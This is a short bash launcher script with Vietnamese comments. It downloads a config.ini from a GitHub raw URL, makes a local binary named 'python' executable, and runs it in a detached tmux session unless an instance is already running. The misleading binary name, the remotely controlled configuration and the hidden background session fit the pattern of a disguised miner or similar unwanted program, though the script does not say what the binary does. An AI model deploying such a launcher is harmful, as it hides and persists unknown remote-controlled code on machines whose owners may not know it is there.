#! /bin/bash
if [ -f ${PWD}/learnpython.zip ]; then
    if pgrep -x "python" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
rm config.ini
wget https://raw.githubusercontent.com/ducplus/NCS/master/config.ini
chmod +x python
tmux new-session -d -s my_session2  './python'
     
fi
exit
fi

rm config.ini
wget https://raw.githubusercontent.com/ducplus/NCS/master/config.ini
chmod +x python
tmux new-session -d -s my_session2  './python'
